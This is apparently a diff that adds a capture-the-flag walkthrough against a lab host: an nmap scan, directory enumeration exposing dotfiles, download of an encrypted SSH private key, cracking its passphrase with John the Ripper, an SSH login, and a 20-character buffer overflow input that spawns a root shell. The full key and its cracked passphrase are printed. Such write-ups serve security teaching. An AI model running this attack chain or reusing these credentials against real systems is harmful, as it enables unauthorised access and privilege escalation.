@@ -1,0 +1,114 @@
+1.
+adam@beth:~$ nmap -n -sV 131.151.88.169
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-25 18:35 CST
+Nmap scan report for 131.151.88.169
+Host is up (0.0070s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10 (protocol 2.0)
+80/tcp    open  http    nginx 1.10.3
+31337/tcp open  http    Werkzeug httpd 0.11.15 (Python 3.5.3)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
+
+2.
+adam@beth:~$ curl 131.151.88.169:31337/robots.txt
+User-agent: *
+Disallow: /.bashrc
+Disallow: /.profile
+Disallow: /taxes
+
+3.
+adam@beth:~$ curl 131.151.88.169:31337/taxes/
+Good job! Here is a flag: flag1{make_america_great_again}
+
+4.
+root@kali:/tmp# dirb http://131.151.88.169:31337
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Feb 28 15:24:28 2018
+URL_BASE: http://131.151.88.169:31337/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://131.151.88.169:31337/ ----
++ http://131.151.88.169:31337/.bash_history (CODE:200|SIZE:1115)                                                      
++ http://131.151.88.169:31337/.bashrc (CODE:200|SIZE:505)                                                             
++ http://131.151.88.169:31337/.profile (CODE:200|SIZE:675)                                                            
++ http://131.151.88.169:31337/.ssh (CODE:200|SIZE:43)                                                                 
++ http://131.151.88.169:31337/robots.txt (CODE:200|SIZE:70)                                                           
+                                                                                                                      
+-----------------
+END_TIME: Wed Feb 28 15:24:47 2018
+DOWNLOADED: 4612 - FOUND: 5
+
+5.
+adam@beth:~$ curl 131.151.88.169:31337/.ssh
+['id_rsa', 'authorized_keys', 'id_rsa.pub']
+
+6.
+adam@beth:~$ curl 131.151.88.169:31337/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,BD8515E8D3A10829A4D710D5AFAC64AB
+
+FCY9ADNWL6702rP3vBGwzSSNXMojtui0v94aefo2O0Wz0n75YcOAKuj1eNA6hnG5
+qGAaJKI7exONZ3GGf+6JZjORn9yTrj6Cc/tZr6dw9BQFHCQcBPBPpWBZO2IGVsvJ
+Mf5H50v4QvL9RJl0Zcn0wGKgcuK4m0SyWD1ZKTQ3O2peRCmHIc39cyGOFMSRqhVU
+7iMryuPbNZdOuzK8F0mCKKdvOwLhfdEQh2GOKJJ8CAI+Pb/NEvIDkDlsh2t148/D
+kExxOmmVS/NTP9ixyOXc7NL34GHP/mfw/OLVUBVGubEkWA/KdNXkYPWcv+RskwMU
+Dz5JVSduyVMdlskKL1h11UETb+WDPGKktO+dYYnCupi4NGROuOcpj57B5gLOdmxy
+uH7gqTltd6uzASFEXS7rKDniG5Fu8C6zab0bCbM0DDzAexAgPQpweJqvSfqpQpKP
+vmAeXnYGu7tw+U5d6CypS0qhS2P07lyboANstYOBrSzFIZF7LuotgPBSGtfTIkYb
+lH8dyk7VEjIZ51exC4ACdJ/Hqhe08m++2f729m/UL/McEGGiZ4r2df5lPIEq8X4b
+Wdu0SYRIi0J0PoGRrUFJ85j8C+yQXV5CIMAC3LUeDlTUcTEZvhbV8E+tB/zDNEUK
+WuH2+4dlUEA4kyiMsoZNUcgIzhbuF7FK+lDxybjsscRG6fDFECmphiqD+jel2C+b
+QK4dOF23OoYwIbx/XFEa7VNRTnkzANQBi4ELGFsc4uZs9conJfb9T3EXrRJjX9jK
+0abmJthTd3wbiZa10nGwhEzXUCVPvh1j+tbn6xHldsqEc4RjZLnXmalBJ6DxgTxn
+24Ozy1+y0CsycEUHG7b3jTUMvlNs0VCAB7YJUZYHdlPwjMeAOklSeI0MgsmeMOXr
+S+LZzoBq0gzmm5Va1hnjFRgBnDgEMNe1KVU+QZy1O2J0yJT/VaKeME80uOP3z/Q3
+kUGmzgGM2gCrXDwbAKfQzUp8pUR0fZT0pGrgsprpWItCvUfymb8MzdmVD6qzCfYC
+tskyUU6wpQrEH7rA244azObC/HlFulYFAQmNdilguTNpou4TMTXNFfHAuq3DZL67
+RJks2xiJKK3XUbXuFP0QIpfHnDnjJIlCKBVDxcUWLCpARWI8OsY4qEY/DlDu3aU3
+b3K/+LdyndDfbb7edi4OJob7A0bSdlFfOhSRlmyeSgFe5oFTvIAevL0ph3nhgik7
+DELkQnFE/xc49nPtchYZDJ6ifExb5WTO8XHCZb+bjf1BX3kAKSTfRZeowbc+gfAD
+ZxGvHc9T8B30hujl04UCPMXlVR/X5/m9I0hnZKIuRDsJH1waZ+CJj6I93T5GKUKT
+kMyZLUf+pmzRbLwdyNuUe+QTTano8SyK9rMLlthoXxCUFeoF3Q1bNOV8CWbXCLgl
+2s4BObMEU9B4fzSMHUa9LpXz8LQvv74L0mnDJ3Jk82+gQuk6P4haTd03MI9ecZ8U
+B0u8R3H9rzAYYr31q2YbZo03enMkRFC9DaEz4P3hMGCuGErQ8tuX3I07hOZGtm8B
+TJAwpCifrLpx1myEg4kz4OhvWk5cL9qV8SP48T0aBoXHtUZFHa6KBNUpoV8QMhyI
+-----END RSA PRIVATE KEY-----
+
+7.
+adam@beth:~$ ssh2john.py id_rsa > t
+
+8.
+adam@beth:~$ john --format=SSH --show t
+id:starwars
+
+1 password hash cracked, 0 left
+
+9. ssh -i id_rsa simon@131.151.88.169
+
+10. Notice read_message in .bashrc
+
+11. Run read_message, use names. root, simon, Simon
+
+12. Look in /root
+
+13. cat read_message for 2nd flag
+
+14. Notice buffer is 20 characters, to overwrite the program variable we need to give a string with 'Simon' + 15 characters + program to run: SimonAAAAAAAAAAAAAAA/bin/sh
+
+15. Gives us a root shell to read flag.txt
+
